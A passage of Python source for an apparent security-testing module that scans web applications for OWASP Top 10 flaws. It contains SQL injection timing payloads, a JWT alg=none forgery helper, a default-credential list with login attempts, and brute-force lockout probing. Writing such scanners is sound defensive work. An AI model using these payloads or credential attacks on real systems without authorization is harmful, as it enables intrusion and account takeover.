"""
OWASP Web Attacks Module - v4.0 HARDENED EDITION
=================================================
MITRE ATT&CK: T1190 - Exploit Public-Facing Application

Full OWASP Top 10 v2021 coverage (A01-A10), authorized security testing only.

This revision specifically fixes six issues identified in code review:

  #20  SSL verification is disabled by default for attack-simulation realism,
       but this is no longer silent. When ssl_verify=False and the target is
       HTTPS, a dedicated Finding is raised (not just a log line), with
       severity scaled by environment context, so it always shows up in the
       report output rather than only in logs.

  #21  XSS detection no longer flags any page that reflects/encodes the
       payload. It now parses the response with a lightweight HTML tokenizer
       to determine whether the payload lands in an *executable* context
       (unescaped inside <script>, inside an unquoted/loosely-quoted HTML
       attribute that can break out, or as a raw unescaped tag) versus a
       safely-encoded context. Encoded reflections are explicitly suppressed.

  #22  Blind/timing-based SQLi payloads (SLEEP, WAITFOR, pg_sleep) are now
       validated by an actual timing harness: a differential baseline
       request vs. an injected-delay request, repeated to reduce jitter
       false positives, with a real elapsed-time comparison instead of
       pattern-matching response text (which a timing payload won't produce
       anyway).

  #23  IDOR/BOLA testing no longer hardcodes /api/Users/1, /2, /3. It now
       performs dynamic object-ID discovery: it queries list/collection
       endpoints, extracts real IDs (numeric or UUID) from the JSON
       response, and only tests IDs that were actually observed to exist on
       the target. Falls back to a small numeric probe only if literally
       nothing else is discoverable, and labels that fallback explicitly in
       the finding evidence so it isn't mistaken for a confirmed object.

  #24  Authentication testing is no longer hardcoded to Juice Shop's
       /rest/user/login. It now performs generalized login-form discovery
       across a configurable list of common login paths, parses any HTML
       login form found (extracting field names instead of assuming
       email/password), and falls back to JSON API login conventions only
       when no HTML form is found. This makes the auth stage meaningful
       against arbitrary targets, not just Juice Shop.

  #25  A real CSRF test is implemented directly in this module (not just
       the single fake template in VulnScannerModule). It fetches
       state-changing pages, looks for legitimate anti-CSRF tokens by name
       and by structural heuristics (hidden input correlated with a cookie
       value), and then attempts the state-changing POST without any token
       to confirm the server doesn't reject it.

Everything else (header analysis, JWT attacks, mass assignment, NoSQL
injection, SSTI, sensitive path probing, file upload, XXE, header injection,
open redirect, SSRF) is retained from the prior version with only minor
hardening for consistency with the new checks above.
"""

import asyncio
import base64
import ipaddress
import json
import logging
import random
import re
import string
import time
from dataclasses import dataclass, field
from html.parser import HTMLParser
from typing import Dict, List, Optional, Set, Tuple, Any
from urllib.parse import urlencode, urljoin, urlparse, parse_qs

import aiohttp

from bas_engine.attack_modules.base import BaseAttackModule
from bas_engine.attack_modules.utils.endpoint_discovery import EndpointDiscoveryEngine
from bas_engine.models.simulation import Finding, Severity

logger = logging.getLogger("secureforge.module.owasp_web.v4")


# =============================================================================
# Static asset filter
# =============================================================================

STATIC_EXTENSIONS = (
    ".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg",
    ".ico", ".woff", ".woff2", ".ttf", ".eot", ".map",
    ".webp", ".pdf", ".zip", ".gz", ".tar",
)


def _is_static_asset(url: str) -> bool:
    """Return True when the URL path ends with a known static-asset extension."""
    path = urlparse(url).path.lower()
    return path.endswith(STATIC_EXTENSIONS)


def _is_internal_url(url: str) -> bool:
    """Return True when the URL resolves to a private / link-local / metadata IP."""
    try:
        host = urlparse(url).hostname or ""
        if host in ("localhost", "ip6-localhost", "ip6-loopback"):
            return True
        if host.endswith(".internal") or host.endswith(".local"):
            return True
        if host in ("169.254.169.254", "metadata.google.internal"):
            return True
        addr = ipaddress.ip_address(host)
        return addr.is_private or addr.is_loopback or addr.is_link_local
    except Exception:
        return False


# =============================================================================
# JWT helpers
# =============================================================================

def _jwt_none_attack(token: str) -> Optional[str]:
    """Return a modified JWT with alg=none and the signature stripped."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        padded = parts[0] + "===="
        header = json.loads(
            base64.urlsafe_b64decode(padded.encode()[: len(padded) - len(padded) % 4 or len(padded)])
        )
        header["alg"] = "none"
        new_hdr = base64.urlsafe_b64encode(
            json.dumps(header, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()
        return f"{new_hdr}.{parts[1]}."
    except Exception:
        return None


def _jwt_decode_payload(token: str) -> Optional[dict]:
    """Base64-decode the JWT payload without verifying the signature."""
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return None
        padded = parts[1] + "===="
        return json.loads(base64.urlsafe_b64decode(padded.encode()))
    except Exception:
        return None


def _add_unique(target_list: list, new_items: list, seen_keys: set) -> None:
    """Append findings to target_list, deduplicating by (title, evidence_prefix)."""
    for f in new_items:
        ev_key = (f.evidence or "")[:120]
        key = (f.title, ev_key)
        if key not in seen_keys:
            seen_keys.add(key)
            target_list.append(f)


# =============================================================================
# FIX #21 — Context-aware XSS reflection parser
# =============================================================================
#
# Rather than a naive `payload in body` substring search (which fires on any
# page that reflects encoded user input — completely normal, safe behaviour),
# we tokenize the HTML around each occurrence of a distinguishing marker from
# the payload and classify the surrounding context as one of:
#
#   EXECUTABLE  - inside a live <script> block, inside an event-handler
#                 attribute (onerror=, onload=, etc.) unescaped, or as a raw
#                 unescaped '<' that opens a new tag/attribute the page did
#                 not intend (e.g. breaking out of an attribute value).
#   ENCODED     - the dangerous characters are present only in HTML-entity
#                 encoded form (&lt;, &gt;, &quot;, &#x27;, &amp;) - safe.
#   TEXT        - payload landed as inert text content with no special
#                 characters surviving unescaped - safe.
#
# Only EXECUTABLE context reflections are reported as confirmed XSS.

_HTML_ENTITY_MAP = {
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#x27;",
    "&": "&amp;",
}


def _html_encode(s: str) -> str:
    return "".join(_HTML_ENTITY_MAP.get(c, c) for c in s)


# A short, unique marker is injected alongside the payload so we can locate
# exactly where it landed in the response even after HTML mangling.
def _make_marker() -> str:
    return "zXssMk" + "".join(random.choices(string.digits, k=6))


class _ReflectionContextParser(HTMLParser):
    """
    Walks the HTML token stream and records, for every place the marker
    string appears, whether it appeared:
      - as part of raw HTML data outside any tag (text context)
      - inside a tag's attribute value (attribute context)
      - inside a <script> element's raw data (script context)
      - as part of a tag name / new tag construction (tag-breakout context)

    HTMLParser already does entity-unescaping for convert_charrefs=True data,
    so anything that survives into handle_data() unescaped and contains our
    raw special characters (<, >, ", ') is a genuine sign the parser itself
    saw it as live markup rather than literal text — which is exactly the
    signal we want, since a real browser's parser behaves the same way.
    """

    def __init__(self, marker: str):
        super().__init__(convert_charrefs=True)
        self.marker = marker
        self.in_script = False
        self.findings: List[str] = []  # context labels

    def handle_starttag(self, tag, attrs):
        if tag.lower() == "script":
            self.in_script = True
        for name, value in attrs:
            if value and self.marker in value:
                # Reflected inside an attribute value. If the attribute is an
                # event handler (onerror, onload, onclick, ...) this is
                # executable regardless of quoting.
                if name.lower().startswith("on"):
                    self.findings.append("event-handler-attribute")
                else:
                    self.findings.append("attribute-value")
            if name and self.marker in name:
                # Marker became part of an attribute *name* — implies the
                # parser thought a new attribute boundary was created here,
                # i.e. a quote/space breakout occurred.
                self.findings.append("attribute-breakout")

    def handle_startendtag(self, tag, attrs):
        self.handle_starttag(tag, attrs)

    def handle_endtag(self, tag):
        if tag.lower() == "script":
            self.in_script = False

    def handle_data(self, data):
        if self.marker not in data:
            return
        if self.in_script:
            self.findings.append("script-context")
        else:
            # Plain text node. If the marker is here as inert text, that's
            # safe — HTMLParser already unescaped entities for us, so the
            # ONLY way raw '<' could survive into a data() callback inside
            # the marker's vicinity is if it was followed by something the
            # parser still treated as text (i.e. genuinely inert).
            self.findings.append("text-context")

    def handle_comment(self, data):
        # Reflection inside an HTML comment is not executable.
        if self.marker in data:
            self.findings.append("comment-context")


def _classify_xss_reflection(marker: str, body: str) -> str:
    """
    Returns one of: 'executable', 'encoded', 'text', 'absent'
    """
    if marker not in body:
        return "absent"

    # If only the HTML-entity-encoded form of any special char from our
    # payload appears immediately around the marker, and the raw marker
    # itself only shows up in already-encoded form, treat as encoded/safe.
    # (HTMLParser handles real unescaping for us below, this is a fast path.)
    parser = _ReflectionContextParser(marker)
    try:
        parser.feed(body)
    except Exception:
        # Malformed HTML — fall back to a conservative raw substring check
        # for unescaped angle brackets directly adjacent to the marker.
        idx = body.find(marker)
        window = body[max(0, idx - 20): idx + len(marker) + 20]
        if "<" in window and ">" in window and "&lt;" not in window:
            return "executable"
        return "text"

    ctx = set(parser.findings)
    if {"event-handler-attribute", "attribute-breakout", "script-context"} & ctx:
        return "executable"
    if "text-context" in ctx or "attribute-value" in ctx or "comment-context" in ctx:
        return "encoded" if _html_encode(marker) in body or marker not in body else "text"
    return "absent"


# =============================================================================
# FIX #22 — Real timing-based blind SQLi detection
# =============================================================================

TIMING_SQLI_PAYLOAD_TEMPLATES = [
    # (label, payload_with_delay, delay_seconds)
    ("MySQL_SLEEP",      "' OR SLEEP({d})-- -",                        5),
    ("MySQL_SLEEP_AND",  "1 AND SLEEP({d})-- -",                       5),
    ("Postgres_SLEEP",   "'; SELECT pg_sleep({d})-- -",                5),
    ("MSSQL_WAITFOR",    "'; WAITFOR DELAY '0:0:{d}'-- -",             5),
    ("SQLite_RANDOMBLOB", "1 AND 1=randomblob({n})-- -",               0),  # not time-reliable, skipped from timing set
]

# Only templates with a meaningful delay are used for the timing harness.
TIMING_SQLI_PAYLOADS = [
    (label, tmpl, delay) for label, tmpl, delay in TIMING_SQLI_PAYLOAD_TEMPLATES if delay > 0
]


@dataclass
class TimingResult:
    label: str
    payload: str
    baseline_elapsed: float
    injected_elapsed: float
    delta: float
    confirmed: bool


# =============================================================================
# FIX #23 — Dynamic object ID discovery for IDOR
# =============================================================================

UUID_RE = re.compile(
    r"\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\b"
)
NUMERIC_ID_KEY_RE = re.compile(r'"(id|userId|user_id|orderId|order_id|basketId|accountId)"\s*:\s*"?(\d+|[0-9a-fA-F-]{36})"?')

# Candidate "collection" endpoints to mine for real object identifiers.
# These are generic REST conventions, not app-specific hardcoded targets —
# they're only used as *discovery sources*; nothing here assumes the IDs
# found will be sequential or guessable.
ID_DISCOVERY_COLLECTION_PATHS = [
    "/api/users", "/api/Users",
    "/api/accounts", "/api/Accounts",
    "/api/orders", "/api/Orders",
    "/api/products", "/api/Products",
    "/api/items", "/api/Items",
    "/rest/basket",
    "/rest/products",
]

# Detail-endpoint templates corresponding to the collection paths above.
# {id} is substituted with a dynamically discovered identifier only.
ID_DISCOVERY_DETAIL_TEMPLATES = [
    "/api/users/{id}", "/api/Users/{id}",
    "/api/accounts/{id}", "/api/Accounts/{id}",
    "/api/orders/{id}", "/api/Orders/{id}",
    "/api/products/{id}", "/api/Products/{id}",
    "/api/items/{id}", "/api/Items/{id}",
    "/rest/basket/{id}",
]


def _extract_object_ids(body: str, limit: int = 8) -> List[str]:
    """Pull plausible object identifiers (numeric or UUID) out of a JSON body."""
    ids: List[str] = []
    seen: Set[str] = set()

    try:
        data = json.loads(body)
    except Exception:
        data = None

    def _maybe_add(v):
        if v is None:
            return
        s = str(v)
        if s and s not in seen and (s.isdigit() or UUID_RE.match(s)):
            seen.add(s)
            ids.append(s)

    if isinstance(data, dict) and "data" in data and isinstance(data["data"], (list, dict)):
        data = data["data"]

    if isinstance(data, list):
        for item in data:
            if isinstance(item, dict):
                for key in ("id", "userId", "user_id", "orderId", "order_id", "basketId", "accountId"):
                    if key in item:
                        _maybe_add(item[key])
    elif isinstance(data, dict):
        for key in ("id", "userId", "user_id", "orderId", "order_id", "basketId", "accountId"):
            if key in data:
                _maybe_add(data[key])

    if not ids:
        # JSON parse failed or had an unexpected shape — fall back to regex
        # extraction of id-like key/value pairs and bare UUIDs.
        for m in NUMERIC_ID_KEY_RE.finditer(body):
            _maybe_add(m.group(2))
        for m in UUID_RE.finditer(body):
            _maybe_add(m.group(0))

    return ids[:limit]


# =============================================================================
# FIX #24 — Generalized login discovery (no hardcoded Juice Shop endpoint)
# =============================================================================

COMMON_LOGIN_PATHS = [
    "/login",
    "/signin",
    "/sign-in",
    "/auth/login",
    "/account/login",
    "/user/login",
    "/admin/login",
    "/api/login",
    "/api/auth/login",
    "/api/v1/login",
    "/api/v1/auth/login",
    "/rest/user/login",   # still probed generically, not hardcoded as THE endpoint
    "/wp-login.php",
    "/users/sign_in",     # Rails/Devise convention
]

PASSWORD_FIELD_RE = re.compile(r'<input[^>]*type=["\']password["\'][^>]*>', re.IGNORECASE)
INPUT_NAME_RE = re.compile(r'<input[^>]*\bname=["\']([^"\']+)["\'][^>]*>', re.IGNORECASE)
INPUT_TYPE_RE = re.compile(r'\btype=["\']([^"\']+)["\']', re.IGNORECASE)
FORM_ACTION_RE = re.compile(r'<form[^>]*\baction=["\']([^"\']*)["\'][^>]*>', re.IGNORECASE)
FORM_METHOD_RE = re.compile(r'\bmethod=["\']([^"\']+)["\']', re.IGNORECASE)

# Generic, non-app-specific default credentials.
DEFAULT_CREDENTIALS_GENERIC = [
    ("admin", "admin"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("administrator", "administrator"),
    ("root", "root"),
    ("test", "test"),
    ("test@test.com", "test"),
    ("user@domain.com", "password"),
    ("guest", "guest"),
]

# Common field-name aliases the module will try when submitting a discovered
# HTML form, since not every site names its fields "email"/"password".
USERNAME_FIELD_ALIASES = ("email", "username", "user", "login", "uid")
PASSWORD_FIELD_ALIASES = ("password", "passwd", "pwd", "pass")


@dataclass
class DiscoveredLoginForm:
    url: str
    action_url: str
    method: str
    username_field: str
    password_field: str
    extra_fields: Dict[str, str] = field(default_factory=dict)
    is_json_api: bool = False  # True if no HTML form was found but a JSON API path responded


# =============================================================================
# FIX #25 — Real CSRF test
# =============================================================================

CSRF_TOKEN_NAME_RE = re.compile(
    r'<input[^>]+name=["\']'
    r'(csrf[_-]?token|_csrf|xsrf[_-]?token|__requestverificationtoken|authenticity_token|csrfmiddlewaretoken)'
    r'["\'][^>]*>',
    re.IGNORECASE,
)
CSRF_META_TAG_RE = re.compile(
    r'<meta[^>]+name=["\'](csrf-token|csrf-param)["\'][^>]+content=["\']([^"\']+)["\']',
    re.IGNORECASE,
)
SAMESITE_COOKIE_RE = re.compile(r'samesite\s*=\s*(strict|lax|none)', re.IGNORECASE)

# Candidate state-changing endpoints to test. These are generic conventions
# (profile update, password change, generic form submit) rather than
# app-specific assumptions; the test only fires a finding when the page is
# reachable AND accepts the POST without any token.
CSRF_CANDIDATE_PATHS = [
    "/profile",
    "/account",
    "/account/update",
    "/settings",
    "/change-password",
    "/password/change",
    "/api/profile",
    "/api/account",
]


class OWASPWebModule(BaseAttackModule):
    MODULE_NAME = "owasp_web"
    DESCRIPTION = (
        "OWASP Top 10 v2021 full-coverage scanner (A01-A10) with authenticated "
        "session support, context-aware XSS detection, real timing-based blind "
        "SQLi, dynamic IDOR discovery, generalized auth discovery, and a real "
        "CSRF test (v4.0)"
    )
    MITRE_TACTIC = "Initial Access"
    MITRE_IDS = [
        "T1190",      # Exploit Public-Facing Application
        "T1059.007",  # JavaScript execution (XSS)
        "T1083",      # File and Directory Discovery (path traversal)
        "T1592",      # Gather Victim Host Info (fingerprinting)
        "T1557",      # Adversary-in-the-Middle (no TLS / TLS bypass)
        "T1203",      # Exploitation for Client Execution (CMD)
        "T1078",      # Valid Accounts (auth bypass)
        "T1110",      # Brute Force (credential testing)
        "T1087",      # Account Discovery (IDOR)
        "T1548",      # Abuse Elevation Control (mass assignment)
    ]

    # =========================================================================
    # Main entry point
    # =========================================================================

    async def execute(self) -> List[Finding]:
        findings: List[Finding] = []
        seen_keys: Set[tuple] = set()

        resolved = await self.resolve_target()
        target = self.build_target_url(resolved, default_scheme="http")

        # ── Options ──────────────────────────────────────────────────────
        max_depth        = self.options.get("max_depth", 2)
        max_urls         = self.options.get("max_urls", 60)
        max_concurrency  = self.options.get("max_concurrency", 10)
        time_budget_s    = self.options.get("time_budget_s", 240)
        request_timeout  = self.options.get("request_timeout_s", 8)
        test_file_upload = self.options.get("test_file_upload", True)
        test_xxe         = self.options.get("test_xxe", True)
        test_ssrf        = self.options.get("test_ssrf", True)
        test_redirect    = self.options.get("test_open_redirect", True)
        test_headers_inj = self.options.get("test_headers", True)
        test_auth        = self.options.get("test_auth", True)
        test_idor        = self.options.get("test_idor", True)
        test_ssti        = self.options.get("test_ssti", True)
        test_csrf        = self.options.get("test_csrf", True)
        test_timing_sqli = self.options.get("test_timing_sqli", True)

        ssl_verify = self.options.get("ssl_verify", False)

        deadline = time.monotonic() + time_budget_s
        sem = asyncio.Semaphore(max_concurrency)

        def time_left() -> bool:
            return time.monotonic() < deadline

        timeout = aiohttp.ClientTimeout(
            total=request_timeout, connect=5, sock_connect=5, sock_read=request_timeout
        )

        connector = aiohttp.TCPConnector(ssl=ssl_verify, limit=max_concurrency)

        auth_token: Optional[str] = None
        auth_headers: Dict[str, str] = {}
        discovered_form: Optional[DiscoveredLoginForm] = None

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={"User-Agent": "SecureForge-BAS/4.0 (authorized security testing)"},
        ) as session:

            # ── Step 0: Baseline reachability ───────────────────────────
            baseline = await self._get(session, sem, target)
            if baseline is None:
                findings.append(self.finding(
                    title="Target Unreachable",
                    description=f"Could not connect to {target}.",
                    severity=Severity.INFO,
                ))
                return findings

            status, resp_headers, body = baseline

            # ── FIX #20: SSL verification disabled — always a Finding ──
            if target.startswith("https://") and not ssl_verify:
                findings.append(self.finding(
                    title="TLS Certificate Verification Disabled During Scan (A02)",
                    description=(
                        "This scan was executed with ssl_verify=False against an HTTPS "
                        "target. All certificate validation (hostname, chain, expiry, "
                        "trust anchor) was bypassed for the duration of this scan. This "
                        "is a deliberate simulation-engine setting intended to avoid "
                        "false negatives caused by self-signed lab certificates, but it "
                        "also means this scan run could NOT have detected an active "
                        "man-in-the-middle position on the network path to the target. "
                        "Any TLS-trust findings from this run should be treated as "
                        "informational only until re-verified with ssl_verify=True."
                    ),
                    severity=Severity.MEDIUM,
                    mitre_id="T1557",
                    evidence=f"Target: {target} (HTTPS) | connector ssl_verify=False",
                    remediation=(
                        "For assessments where TLS trust itself is in scope, re-run with "
                        "the module option ssl_verify=True so certificate validation "
                        "errors surface as findings rather than being silently bypassed."
                    ),
                    raw_data={"option": "ssl_verify", "value": False, "target_scheme": "https"},
                ))

            # ── Step 1: A02 / A05 — Header analysis ─────────────────────
            hdr_findings = await self._check_headers(target, resp_headers)
            findings.extend(hdr_findings)

            # ── FIX #24: Step 2 — Generalized authentication testing ───
            if test_auth:
                auth_result = await self._test_authentication_generalised(session, sem, target)
                _add_unique(findings, auth_result["findings"], seen_keys)
                auth_token = auth_result.get("token")
                discovered_form = auth_result.get("form")
                if auth_token:
                    auth_headers = {"Authorization": f"Bearer {auth_token}"}
                    await self.emit_event(
                        "INFO", "[A07] Authenticated — proceeding with full authenticated scan"
                    )

            # ── Step 3: A07 / A02 — JWT attacks ─────────────────────────
            if auth_token and test_auth and time_left():
                jwt_findings = await self._test_jwt_attacks(session, sem, target, auth_token)
                _add_unique(findings, jwt_findings, seen_keys)

            # ── Step 4: Crawl ────────────────────────────────────────────
            self.logger.info(f"[owasp_web v4] Crawling {target}")
            crawl_budget = max(5.0, deadline - time.monotonic())
            engine = EndpointDiscoveryEngine(
                session, target,
                max_endpoints=max_urls, max_depth=max_depth,
                timeout=request_timeout, max_concurrency=max_concurrency,
                time_budget_s=crawl_budget,
            )
            discovered_urls = await engine.discover()
            if target not in discovered_urls:
                discovered_urls.insert(0, target)

            for extra in SENSITIVE_PATHS:
                extra_url = urljoin(target, extra)
                if extra_url not in discovered_urls:
                    discovered_urls.append(extra_url)

            discovered_urls = discovered_urls[:max_urls]
            self.logger.info(f"[owasp_web v4] Probing {len(discovered_urls)} endpoints")
            await self.emit_event(
                "INFO", f"[CRAWL] {len(discovered_urls)} endpoints queued on {target}"
            )

            # ── Step 5: Sensitive path probing ──────────────────────────
            if time_left():
                sp_findings = await self._test_sensitive_paths(session, sem, target, auth_headers)
                _add_unique(findings, sp_findings, seen_keys)

            # ── Step 6: One-time structural probes ──────────────────────
            one_time: list = []
            if test_file_upload and time_left():
                one_time.append(self._test_file_upload_once(session, sem, target, auth_headers))
            if test_xxe and time_left():
                one_time.append(self._test_xxe_once(session, sem, target, auth_headers))
            if test_auth and test_idor and auth_token and time_left():
                # FIX #23: dynamic IDOR, no hardcoded IDs
                one_time.append(self._test_idor_dynamic(session, sem, target, auth_token))
                one_time.append(self._test_mass_assignment(session, sem, target, auth_headers))
            if test_auth and time_left():
                one_time.append(self._test_nosql_injection(session, sem, target, discovered_form))
            if test_csrf and time_left():
                # FIX #25: real CSRF test
                one_time.append(self._test_csrf(session, sem, target, auth_headers))

            if one_time:
                ot_results = await asyncio.gather(*one_time, return_exceptions=True)
                for r in ot_results:
                    if isinstance(r, list):
                        _add_unique(findings, r, seen_keys)
                    elif isinstance(r, Exception):
                        self.logger.debug(f"[owasp_web v4] one-time probe error: {r}")

            # ── Step 7: Per-endpoint analysis ───────────────────────────
            async def analyze_one(url: str) -> List[Finding]:
                local: List[Finding] = []
                if not time_left():
                    return local

                is_static = _is_static_asset(url)
                await self.emit_event(
                    "INFO", f"[OWASP] {'[skip-static] ' if is_static else ''}Analyzing: {url}"
                )
                if is_static:
                    return local

                parsed = urlparse(url)
                query = parse_qs(parsed.query)

                sub: list = []
                if query:
                    for param in query:
                        sub.append(self._test_param_injection(session, sem, url, param, auth_headers))
                        if test_timing_sqli:
                            sub.append(self._test_timing_sqli(session, sem, url, param, auth_headers))
                    if test_redirect and any(p in query for p in REDIRECT_PARAMS):
                        sub.append(self._test_open_redirect(session, sem, url, query))
                    if test_ssrf and any(p in query for p in SSRF_PARAMS):
                        sub.append(self._test_ssrf(session, sem, url, query, auth_headers))
                else:
                    for probe in PROBE_PARAMS[:5]:
                        sub.append(self._test_param_injection(session, sem, url, probe, auth_headers))
                        if test_timing_sqli:
                            sub.append(self._test_timing_sqli(session, sem, url, probe, auth_headers))
                    synthetic = {p: ["PROBE"] for p in PROBE_PARAMS[:5]}
                    if test_redirect:
                        sub.append(self._test_open_redirect(session, sem, url, synthetic))
                    if test_ssrf:
                        sub.append(self._test_ssrf(session, sem, url, synthetic, auth_headers))

                sub.append(self._test_path_traversal_path(session, sem, url, auth_headers))
                sub.append(self._test_forms(session, sem, url, auth_headers))
                if test_ssti:
                    sub.append(self._test_ssti(session, sem, url, auth_headers))
                if test_headers_inj:
                    sub.append(self._test_header_injection(session, sem, url))

                results = await asyncio.gather(*sub, return_exceptions=True)
                for r in results:
                    if isinstance(r, list):
                        local.extend(r)
                return local

            tasks = [asyncio.create_task(analyze_one(u)) for u in discovered_urls]
            while tasks:
                if not time_left():
                    self.logger.warning("[owasp_web v4] Time budget exhausted — cancelling remaining tasks")
                    for t in tasks:
                        if not t.done():
                            t.cancel()
                    await asyncio.gather(*tasks, return_exceptions=True)
                    break
                done, pending = await asyncio.wait(
                    tasks, timeout=2.0, return_when=asyncio.FIRST_COMPLETED
                )
                for t in done:
                    try:
                        _add_unique(findings, await t, seen_keys)
                    except Exception as exc:
                        self.logger.debug(f"[owasp_web v4] task error: {exc}")
                tasks = list(pending)

        if not findings:
            findings.append(self.finding(
                title="No Vulnerabilities Detected",
                description=f"Completed full OWASP Top 10 v2021 scan of {len(discovered_urls)} endpoints.",
                severity=Severity.INFO,
                mitre_id="T1190",
                evidence=f"Scan target: {target}",
            ))

        return findings

    # =========================================================================
    # FIX #24 — Generalized login discovery & credential testing
    # =========================================================================

    async def _discover_login_form(
        self, session, sem, target: str
    ) -> Optional[DiscoveredLoginForm]:
        """
        Probe a list of common login paths and parse the first HTML form found
        that contains a password field. Falls back to treating a JSON-API-like
        path (one of COMMON_LOGIN_PATHS under /api/) as a login endpoint with
        conventional email/password JSON fields if no HTML form is found
        anywhere.
        """
        json_fallback_url: Optional[str] = None

        for path in COMMON_LOGIN_PATHS:
            url = urljoin(target, path)
            resp = await self._get(session, sem, url)
            if not resp:
                continue
            status, _, body = resp
            if status >= 500:
                continue

            if PASSWORD_FIELD_RE.search(body):
                form_action_match = FORM_ACTION_RE.search(body)
                action = form_action_match.group(1) if form_action_match else path
                action_url = urljoin(url, action) if action else url

                method_match = FORM_METHOD_RE.search(body)
                method = (method_match.group(1).upper() if method_match else "POST")

                field_names = INPUT_NAME_RE.findall(body)
                username_field = next(
                    (f for f in field_names if f.lower() in USERNAME_FIELD_ALIASES), None
                )
                password_field = next(
                    (f for f in field_names if f.lower() in PASSWORD_FIELD_ALIASES), None
                )
                # If alias matching fails, fall back to positional heuristics:
                # the field immediately preceding the password input in the
                # form is very commonly the username/email field.
                if not password_field:
                    password_field = "password"
                if not username_field and field_names:
                    try:
                        pw_idx = field_names.index(password_field)
                        username_field = field_names[pw_idx - 1] if pw_idx > 0 else "username"
                    except ValueError:
                        username_field = "username"
                if not username_field:
                    username_field = "username"

                self.logger.info(f"[owasp_web v4] Discovered HTML login form at {url} -> {action_url}")
                return DiscoveredLoginForm(
                    url=url,
                    action_url=action_url,
                    method=method,
                    username_field=username_field,
                    password_field=password_field,
                    is_json_api=False,
                )

            if json_fallback_url is None and ("/api/" in path or path.startswith("/rest/")):
                # Plausible JSON API login path that responded without 5xx,
                # even though it has no renderable HTML form (typical of a
                # pure JSON API). Keep as a fallback candidate.
                json_fallback_url = url

        if json_fallback_url:
            self.logger.info(f"[owasp_web v4] No HTML login form found; using JSON API fallback at {json_fallback_url}")
            return DiscoveredLoginForm(
                url=json_fallback_url,
                action_url=json_fallback_url,
                method="POST",
                username_field="email",
                password_field="password",
                is_json_api=True,
            )

        return None

    async def _submit_login_form(
        self, session, sem, form: DiscoveredLoginForm, username: str, password: str
    ) -> Tuple[int, dict, str]:
        """Submit credentials to a discovered login form/endpoint, JSON or form-encoded."""
        async with sem:
            try:
                if form.is_json_api:
                    async with session.post(
                        form.action_url,
                        json={form.username_field: username, form.password_field: password},
                        headers={"Content-Type": "application/json"},
                        allow_redirects=False,
                    ) as resp:
                        body = await resp.text(errors="replace")
                        return resp.status, dict(resp.headers), body
                else:
                    data = {form.username_field: username, form.password_field: password}
                    if form.method == "GET":
                        async with session.get(
                            form.action_url, params=data, allow_redirects=False
                        ) as resp:
                            body = await resp.text(errors="replace")
                            return resp.status, dict(resp.headers), body
                    async with session.post(
                        form.action_url, data=data, allow_redirects=False
                    ) as resp:
                        body = await resp.text(errors="replace")
                        return resp.status, dict(resp.headers), body
            except Exception as exc:
                self.logger.debug(f"Login submit failed: {exc}")
                return 0, {}, ""

    @staticmethod
    def _extract_token_from_response(headers: dict, body: str, cookies) -> Optional[str]:
        """Look for a bearer token in JSON body or a session cookie as auth evidence."""
        try:
            data = json.loads(body)
            token = (
                data.get("token")
                or data.get("authentication", {}).get("token")
                or data.get("access_token")
                or data.get("data", {}).get("token")
            )
            if token:
                return token
        except Exception:
            pass
        # Session cookie counts as "authenticated" evidence even without a
        # bearer token, for form-based (non-API) logins.
        if cookies:
            for c in cookies.values():
                if c.key.lower() in ("session", "sessionid", "connect.sid", "jsessionid", "auth"):
                    return f"cookie:{c.key}={c.value[:8]}..."
        return None

    async def _test_authentication_generalised(self, session, sem, target: str) -> dict:
        findings: List[Finding] = []
        result: dict = {"findings": findings, "token": None, "form": None}

        form = await self._discover_login_form(session, sem, target)
        if not form:
            findings.append(self.finding(
                title="No Login Endpoint Discovered (A07)",
                description=(
                    f"Probed {len(COMMON_LOGIN_PATHS)} common login paths under {target} "
                    "and found no HTML form containing a password field, nor a "
                    "plausible JSON login API path. Authentication-dependent tests "
                    "(JWT attacks, IDOR, mass assignment) were skipped."
                ),
                severity=Severity.INFO,
                evidence=f"Probed paths: {', '.join(COMMON_LOGIN_PATHS)}",
            ))
            return result

        result["form"] = form

        # Try generic default credentials against the discovered form/endpoint.
        for username, password in DEFAULT_CREDENTIALS_GENERIC:
            status, headers, body = await self._submit_login_form(session, sem, form, username, password)
            if status == 0:
                continue
            if status in (200, 201, 302, 303):
                # For redirect-based form logins, a redirect away from the
                # login page itself is a stronger signal than just status 200
                # (200 commonly just re-renders the login page with an error).
                if status in (302, 303):
                    location = headers.get("Location", "")
                    if location and "login" in location.lower():
                        continue  # redirected back to login = failed attempt
                if PASSWORD_FIELD_RE.search(body) and status == 200:
                    # Login page re-rendered with the form still present —
                    # very likely a failed attempt, not success.
                    continue

                token = self._extract_token_from_response(headers, body, getattr(session.cookie_jar, "filter_cookies", lambda u: {})(form.action_url))
                if token:
                    findings.append(self.finding(
                        title=f"Default Credentials Accepted at {form.action_url} (A07)",
                        description=(
                            f"Login succeeded with '{username}' / '{password}' against a "
                            f"dynamically discovered login endpoint ({'JSON API' if form.is_json_api else 'HTML form'}). "
                            "Default/weak credentials are an OWASP A07 critical failure."
                        ),
                        severity=Severity.CRITICAL,
                        mitre_id="T1078",
                        evidence=f"{form.method} {form.action_url} -> HTTP {status}, auth evidence: {token[:40]}",
                        remediation="Disable default accounts and enforce a strong password policy with MFA.",
                        raw_data={"username": username, "endpoint": form.action_url},
                    ))
                    result["token"] = token if not token.startswith("cookie:") else None
                    return result

        # No account lockout / rate limiting check against the same endpoint.
        try:
            statuses = []
            for _ in range(6):
                status, headers, body = await self._submit_login_form(
                    session, sem, form, "probe_invalid@x.invalid", "definitely-wrong-pw"
                )
                statuses.append(status)
                await asyncio.sleep(0.05)
            locked = any(s in (429, 423, 403) for s in statuses)
            if not locked and any(s != 0 for s in statuses):
                findings.append(self.finding(
                    title=f"No Account Lockout / Rate Limiting on Login (A07)",
                    description=(
                        f"Login endpoint at {form.action_url} accepted 6 consecutive failed "
                        "attempts without returning HTTP 429/423/403. Brute-force attacks "
                        "are not mitigated."
                    ),
                    severity=Severity.HIGH,
                    mitre_id="T1110",
